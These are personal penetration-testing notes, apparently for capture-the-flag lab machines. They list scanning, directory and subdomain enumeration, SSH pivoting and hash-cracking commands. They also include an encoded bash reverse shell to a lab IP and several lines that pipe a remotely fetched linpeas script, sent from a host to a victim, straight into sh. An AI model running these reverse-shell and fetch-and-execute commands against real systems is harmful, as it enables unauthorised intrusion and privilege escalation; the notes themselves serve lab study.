# prep
## Useful commands
sudo nmap -sC -sV -vv -p- 10.10.11.221

## dirs 
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u domain.name

## subdomains:
gobuster vhost -u http://domain.domain \
-w ~/Downloads/subdomains \
--append-domain -t 50


ffuf -c -ac -w ~/Downloads/subdomains-10000.txt -H 'Host: FUZZ.domain.name' -u http://domainname 

## ssh pivot
ssh -L 1234:localhost:8080 rosa@10.10.11.38 
connect using localhost:1234

python3 -c 'import pty; pty.spawn("/bin/sh")'

base64
echo -n 'bash -i >& /dev/tcp/10.10.16.12/4242 0>&1' | base64 

## SCP
scp user@10.10.11.74:/var/backup/backup.tar.gz .

## leanpeas path
cd /usr/share/peass/
## From public github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

## Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

## Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim


## hashcat basic
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force


## docker folder - build with dockerfile
sudo docker build -t dockername . 
sudo docker run -it -v $(pwd):/app dockername


##hash
echo 'pass'| base64 -d > bcrypt.hash
